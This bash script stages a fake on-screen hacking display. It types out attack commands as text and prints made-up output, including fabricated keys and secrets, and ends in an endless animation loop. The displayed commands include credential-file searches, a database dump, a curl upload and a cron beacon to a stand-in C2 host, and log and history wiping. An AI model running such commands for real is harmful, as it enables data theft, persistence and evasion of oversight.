#!/bin/bash
# hack-sim.sh — Visual hacking simulation for council machines
# Usage: hack-sim.sh [hostname] [ip]
# Opens fullscreen green-on-black terminal output simulating a breach

HOST="${1:-$(hostname)}"
IP="${2:-127.0.0.1}"
USER_NAME="$(whoami)"

# Terminal colors
G='\033[1;32m'   # Green bold
R='\033[1;31m'   # Red bold
Y='\033[1;33m'   # Yellow bold
C='\033[1;36m'   # Cyan bold
W='\033[1;37m'   # White bold
D='\033[0;32m'   # Green dim
N='\033[0m'      # Reset

clear

# Function to type text with realistic speed
typeit() {
    local text="$1"
    local delay="${2:-0.02}"
    for ((i=0; i<${#text}; i++)); do
        printf '%s' "${text:$i:1}"
        sleep "$delay"
    done
    echo
}

# Function for command prompt
prompt() {
    printf "${R}root@${HOST}${N}:${C}~# ${G}"
}

# Skull ASCII art
show_skull() {
    echo -e "${R}"
    cat << 'SKULL'
    ██████████████████████████████████████
    █                                    █
    █      ████████    ████████          █
    █      ██    ██    ██    ██          █
    █      ████████    ████████          █
    █                                    █
    █          ████████████              █
    █          ██        ██              █
    █          ██ ██  ██ ██              █
    █          ██        ██              █
    █          ████████████              █
    █                                    █
    █   >>>  SYSTEM COMPROMISED  <<<     █
    █                                    █
    ██████████████████████████████████████
SKULL
    echo -e "${N}"
}

# Random hex strings
randhex() {
    cat /dev/urandom | LC_ALL=C tr -dc 'a-f0-9' | head -c "$1"
}

# === PHASE 1: Initial breach ===
echo -e "${R}[!] INTRUSION DETECTED — ${HOST} (${IP})${N}"
echo -e "${D}$(date '+%Y-%m-%d %H:%M:%S') — Unauthorized access initiated${N}"
echo
sleep 0.5

prompt; typeit "ssh -o StrictHostKeyChecking=no root@${IP}" 0.03
echo -e "${D}Connecting to ${IP}:22...${N}"
sleep 0.3
echo -e "${D}Authenticating with stolen RSA key...${N}"
sleep 0.5
echo -e "${G}ACCESS GRANTED${N}"
echo
sleep 0.3

# === PHASE 2: System recon ===
prompt; typeit "uname -a" 0.02
echo -e "${D}Darwin ${HOST} 24.4.0 Darwin Kernel Version 24.4.0 RELEASE_ARM64_T8103 arm64${N}"
echo
sleep 0.2

prompt; typeit "whoami && id" 0.02
echo -e "${G}root${N} uid=0(root) gid=0(wheel) groups=0(wheel),1(daemon)"
echo
sleep 0.2

prompt; typeit "cat /etc/passwd | head -5" 0.02
echo -e "${D}root:*:0:0:System Administrator:/var/root:/bin/zsh"
echo -e "daemon:*:1:1:System Services:/var/root:/usr/bin/false"
echo -e "_spotlight:*:89:89:Spotlight:/var/empty:/usr/bin/false"
echo -e "${USER_NAME}:*:501:20:${USER_NAME}:/Users/${USER_NAME}:/bin/zsh"
echo -e "_windowserver:*:88:88:WindowServer:/var/empty:/usr/bin/false${N}"
echo
sleep 0.3

# === PHASE 3: Network scan ===
prompt; typeit "netstat -an | grep LISTEN | head -8" 0.02
echo -e "${D}tcp4  0  0  *.22        *.*   LISTEN"
echo -e "tcp4  0  0  *.443       *.*   LISTEN"
echo -e "tcp4  0  0  *.3030      *.*   LISTEN"
echo -e "tcp4  0  0  *.5900      *.*   LISTEN"
echo -e "tcp4  0  0  *.8080      *.*   LISTEN${N}"
echo
sleep 0.3

prompt; typeit "arp -a | head -6" 0.02
echo -e "${D}? (100.74.101.14) at aa:bb:cc:dd:ee:ff on utun3 [ethernet]"
echo -e "? (100.99.176.126) at 11:22:33:44:55:66 on utun3 [ethernet]"
echo -e "? (100.101.192.1) at 77:88:99:aa:bb:cc on utun3 [ethernet]"
echo -e "? (192.168.1.1) at de:ad:be:ef:ca:fe on en0 [ethernet]${N}"
echo
sleep 0.3

# === PHASE 4: Data exfiltration ===
prompt; typeit "find /Users/${USER_NAME} -name '*.key' -o -name '*.pem' -o -name '*.env' 2>/dev/null" 0.02
echo -e "${D}/Users/${USER_NAME}/.ssh/id_ed25519"
echo -e "/Users/${USER_NAME}/.ssh/id_rsa"
echo -e "/Users/${USER_NAME}/projects/.env.production"
echo -e "/Users/${USER_NAME}/Claude/.env${N}"
echo
sleep 0.3

prompt; typeit "cat /Users/${USER_NAME}/.ssh/id_ed25519" 0.02
echo -e "${Y}-----BEGIN OPENSSH PRIVATE KEY-----"
echo -e "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAA$(randhex 20)"
echo -e "$(randhex 70)"
echo -e "$(randhex 70)"
echo -e "$(randhex 70)"
echo -e "$(randhex 40)=="
echo -e "-----END OPENSSH PRIVATE KEY-----${N}"
echo
sleep 0.5

prompt; typeit "cat /Users/${USER_NAME}/projects/.env.production" 0.02
echo -e "${R}DB_HOST=db.admira-internal.com"
echo -e "DB_PASSWORD=Adm1r4N3xt_$(randhex 8)!"
echo -e "API_KEY=sk-ant-api03-$(randhex 32)..."
echo -e "STRIPE_SECRET=sk_live_$(randhex 24)"
echo -e "JWT_SECRET=$(randhex 40)${N}"
echo
sleep 0.5

# === PHASE 5: Lateral movement ===
prompt; typeit "echo 'Scanning internal Tailscale network...'" 0.02
echo
for target_ip in 100.99.176.126 100.101.192.1 100.114.113.88 100.74.101.14 100.75.118.75 100.84.81.45 100.121.18.12 100.110.80.2; do
    if [ "$target_ip" != "$IP" ]; then
        echo -e "${D}  Probing ${target_ip}...${N} ${G}VULNERABLE${N}"
        sleep 0.15
    fi
done
echo
sleep 0.3

prompt; typeit "mysqldump -h db.admira-internal.com --all-databases > /tmp/exfil.sql" 0.03
echo -e "${D}Dumping database 'admira_production'... ${G}OK${D} (142 tables)"
echo -e "Dumping database 'council_members'... ${G}OK${D} (38 tables)"
echo -e "Dumping database 'financial_records'... ${G}OK${D} (67 tables)"
echo -e "${Y}[+] Total: 247 tables, 891MB exported${N}"
echo
sleep 0.5

prompt; typeit "curl -X POST https://c2.darknet.onion/exfil -F 'data=@/tmp/exfil.sql'" 0.02
echo -e "${D}Uploading to C2 server..."
for pct in 10 25 40 55 70 85 100; do
    printf "\r${G}  ["; printf '%0.s=' $(seq 1 $((pct/5))); printf '%0.s ' $(seq 1 $((20-pct/5))); printf "] ${pct}%%${N}"
    sleep 0.2
done
echo
echo -e "${G}[+] Upload complete — 891MB exfiltrated${N}"
echo
sleep 0.5

# === PHASE 6: Persistence ===
prompt; typeit "crontab -l 2>/dev/null; echo '*/5 * * * * /tmp/.b4ckd00r.sh' | crontab -" 0.02
echo -e "${D}Backdoor cron installed${N}"
echo
sleep 0.2

prompt; typeit "echo '#!/bin/bash' > /tmp/.b4ckd00r.sh && echo 'curl -s https://c2.darknet.onion/beacon?h=${HOST}' >> /tmp/.b4ckd00r.sh && chmod +x /tmp/.b4ckd00r.sh" 0.015
echo -e "${D}Persistence established${N}"
echo
sleep 0.3

# === PHASE 7: Cover tracks ===
prompt; typeit "history -c && echo '' > ~/.zsh_history && rm -f /var/log/system.log" 0.02
echo -e "${D}Tracks cleared${N}"
echo
sleep 0.5

# === FINALE ===
show_skull
echo
echo -e "${R}  ╔══════════════════════════════════════════════╗${N}"
echo -e "${R}  ║                                              ║${N}"
echo -e "${R}  ║  ${W}TARGET: ${G}${HOST}${R}$(printf '%*s' $((30-${#HOST})) '')║${N}"
echo -e "${R}  ║  ${W}IP:     ${G}${IP}${R}$(printf '%*s' $((30-${#IP})) '')║${N}"
echo -e "${R}  ║  ${W}STATUS: ${Y}FULLY COMPROMISED${R}                  ║${N}"
echo -e "${R}  ║  ${W}DATA:   ${Y}891MB EXFILTRATED${R}                  ║${N}"
echo -e "${R}  ║                                              ║${N}"
echo -e "${R}  ╚══════════════════════════════════════════════╝${N}"
echo

# Infinite matrix rain effect at the end
echo -e "${G}"
while true; do
    line=""
    for ((i=0; i<$(tput cols); i++)); do
        r=$((RANDOM % 4))
        if [ $r -eq 0 ]; then
            line+="$(printf '%x' $((RANDOM % 16)))"
        elif [ $r -eq 1 ]; then
            line+=" "
        elif [ $r -eq 2 ]; then
            chars="01アイウエオカキクケコ@#$%&"
            line+="${chars:$((RANDOM % ${#chars})):1}"
        else
            line+="$(printf '%x' $((RANDOM % 256)))"
        fi
    done
    echo "$line"
    sleep 0.05
done
